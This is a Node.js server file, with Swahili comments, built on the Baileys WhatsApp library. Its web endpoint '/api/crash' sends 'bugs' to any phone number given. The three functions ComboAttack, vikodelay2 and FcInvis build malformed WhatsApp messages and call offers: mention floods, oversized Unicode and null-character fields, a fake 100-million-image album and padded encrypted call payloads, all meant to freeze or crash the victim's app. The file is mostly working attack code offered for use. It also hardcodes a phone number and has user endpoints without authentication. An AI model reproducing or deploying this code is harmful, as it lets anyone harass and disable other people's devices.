const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, encodeSignedDeviceIdentity, jidDecode } = require("@whiskeysockets/baileys");
const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const pino = require("pino");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

const loadUsers = () => {
  try {
    return JSON.parse(fs.readFileSync("./users.json", "utf8"));
  } catch {
    return [];
  }
};

const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "Mtumiaji ameongezwa mafanikio." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin ameongezwa mafanikio." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Uwezo umesasishwa." });
  } else {
    res.status(404).json({ success: false, message: "Mtumiaji hajapatikana." });
  }
});

// ==========================================
// 1. FUNCTION YA KWANZA: COMBO ATTACK
// ==========================================
async function ComboAttack(sock, target) {
  try {
    const sleep = (ms) => new Promise(res => setTimeout(res, ms));

    for (let i = 1; i <= 75; i++) {
      const Reoclint = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1800 },
          () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")
      ];

      await sock.relayMessage(target, {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1234567891234@newsletter",
            newsletterName: "ϟ-£Rîēdz. Ēksò4!x¿𖣂?",
            caption: "I Am Tired",
            inviteExpiration: Date.now() + 90000,
            contextInfo: {
              participant: target,
              remoteJid: "status@broadcast",
              mentionedJid: Reoclint,
              stanzaId: "123" + Date.now()
            }
          }
        }
      }, { messageId: "BLANK_" + i });

      console.log(`Loh Awas ${i}`);
      await sleep(350);
    }

    await sock.relayMessage(target, {
      message: {
        groupInviteMessage: {
          groupJid: "1975@g.us",
          inviteCode: "ꦽ".repeat(3000),
          inviteExpiration: Date.now() + 999999999,
          groupName: "\u200B" + "ꦾ".repeat(1500),
          caption: "R" + "ꦾ".repeat(800),
          body: { text: "Always Solo Only" + "ꦽ".repeat(2000) }
        }
      }
    });

    await sock.relayMessage(target, {
      message: {
        interactiveMessage: {
          body: { text: "\u200B".repeat(1000) + "Вы готовы?" },
          nativeFlowMessage: {
            buttons: [
              { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Продолжить", id: "NEXT" }) }
            ]
          }
        }
      }
    });

    await sock.relayMessage(target, {
      message: {
        callMessage: {
          callId: "CALL_" + Date.now(),
          callType: "video",
          label: "Входящий видеозвонок",
          status: "ONGOING"
        }
      }
    });

    await sock.sendNode({
      tag: "message",
      attrs: { to: target, id: sock.generateMessageTag() },
      content: [
        {
          tag: "call_log_message",
          attrs: {
            callId: "CALL_",
            callType: "video",
            status: "missed",
            label: "XxX" + "\u200B".repeat(4000)
          }
        },
        {
          tag: "group_invite_message",
          attrs: {
            jid: "1975@g.us",
            invite_code: "ARCABOUTYOU",
            group_name: "XxX | Message",
            caption: "ꦽꦽꦽꦽ".repeat(1500)
          }
        }
      ]
    });

    console.log(`Ufanisi wa Combo Attack: ${target}`);
  } catch (err) {
    console.error("Hitilafu kwenye Combo Attack:", err);
    throw err;
  }
}

// ==========================================
// 2. FUNCTION YA PILI: VIKODELAY2
// ==========================================
async function vikodelay2(sock, target) {
  try {
    const album = await sock.generateWAMessageFromContent(target, {
      albumMessage: {
        expectedImageCount: 100000000,
        expectedVideoCount: 0,
      }
    }, {});
    
    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
        mediaKeyTimestamp: 1758521043,
        isSampled: true, 
        viewOnce: false, 
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter", 
            newsletterName: "7eppeli", 
            contentType: "UPDATE_CARD", 
            accessibilityText: "\u0000".repeat(9000), 
            serverMessageId: 18888888
          }, 
          mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
        annotations: [
          {
            polygonVertices: [
              { x: 0.05515563115477562, y: 0.4132135510444641 },
              { x: 0.9448351263999939, y: 0.4132135510444641 },
              { x: 0.9448351263999939, y: 0.5867812633514404 },
              { x: 0.05515563115477562, y: 0.5867812633514404 }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "7eppeli",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(1000) 
            }
          }
        ]
      }
    };
    
    const messages = [];
    for (let i = 0; i < 1000; i++) {
      const imgMsg = await sock.generateWAMessageFromContent(target, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
        messageAssociation: {  
          associationType: 1,  
          parentMessageKey: album.key  
        }  
      };  
      messages.push(imgMsg);
    }

    await sock.relayMessage("status@broadcast", album.message, {
      messageId: album.key.id,
      statusJidList: [target]
    });
    
    for (const msg of messages) {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target]
      });
    }
    console.log(`Ufanisi wa Vikodelay2: ${target}`);
  } catch (err) {
    console.error("Hitilafu kwenye Vikodelay2:", err);
    throw err;
  }
}

// ==========================================
// 3. FUNCTION YA TATU: FC INVIS (Fixed & Secured)
// ==========================================
async function FcInvis(sock, target) {
    console.log(`Inatuma shambulio la FcInvis kwenda kwa ${target}`);

    let Reomsg = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(Reomsg);

    let Rxcl = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let Rxcl2 = Rxcl();
    let Reomsg2 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;

        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let decodedJid = jidDecode(jid);
                if (!decodedJid) return null;
                let { user: targetUser } = decodedJid;
                let ownDecoded = jidDecode(meId);
                let ownPnUser = ownDecoded ? ownDecoded.user : null;

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = Reomsg2(yntkts ? yntkts(msg) : sock.encodeWAMessage(msg));

                return Rxcl2.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        Reomsg,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    await sock.sendNode(callNode);
    console.log(`Ufanisi wa FcInvis: ${target}`);
}

// ==========================================
// ROUTE YA API YA KUTUMA BUG KUPITIA WEBSITE
// ==========================================
app.post("/api/crash", async (req, res) => {
  const { target, bug } = req.body;
  
  if (!target) {
    return res.status(400).json({ success: false, message: "Weka namba ya target kwanza." });
  }

  const activeSock = global.sock;
  if (!activeSock) {
    return res.status(500).json({ success: false, message: "WhatsApp bado haijaunganishwa kwenye Server/Bot." });
  }

  try {
    const formattedTarget = target.includes("@s.whatsapp.net") ? target : target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (bug === "FcInvis") {
      await FcInvis(activeSock, formattedTarget);
    } else if (bug === "vikodelay2" || bug === "Blank Freeze") {
      await vikodelay2(activeSock, formattedTarget);
    } else {
      await ComboAttack(activeSock, formattedTarget);
    }
    
    res.json({ success: true, message: `Bug ya (${bug || 'Combo'}) imetumwa kwa mafanikio kwenda kwa ${target}` });
  } catch (err) {
    console.error("API Error:", err);
    res.status(500).json({ success: false, message: "Imeshindikana kutuma bug", error: err.message });
  }
});

// ==========================================
// KUANZISHA WHATSAPP BOT KWENYE CLOUD SERVER
// ==========================================
async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState("auth_info");

  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    auth: state,
    printQRInTerminal: false
  });

  global.sock = sock;

  // Ikiwa bado haijasajiliwa, unaweza kuweka namba yako hapa chini kwenye mabano ili ipate Pairing Code moja kwa moja kupitia Logs za Render
  if (!sock.authState.creds.registered) {
    const phoneNumber = "255651675994"; // <--- Weka namba yako hapa kama unahitaji pairing code mpya (Mfano: "255712345678")
    
    if (phoneNumber) {
      try {
        await delay(3000);
        let code = await sock.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`\n================================`);
        console.log(` PAIRING CODE YAKO NI: ${code}`);
        console.log(`================================\n`);
      } catch (err) {
        console.error("Hitilafu kuomba pairing code:", err);
      }
    } else {
      console.log("ℹ️ Weka namba ya simu kwenye variable ya 'phoneNumber' ndani ya server.js kama unahitaji pairing code mpya.");
    }
  }

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;
    
    if (connection === "close") {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log("Muunganisho umekatika. Unajaribu kuunganisha tena...", shouldReconnect);
      if (shouldReconnect) {
        startBot();
      }
    } else if (connection === "open") {
      console.log("🔥 WhatsApp imeingia na kuunganishwa kwa mafanikio kwenye server!");
    }
  });

  sock.ev.on("creds.update", saveCreds);
}

app.listen(PORT, () => {
  console.log(`Seva inawaka kwenye bandari (port) ${PORT}`);
  startBot();
});
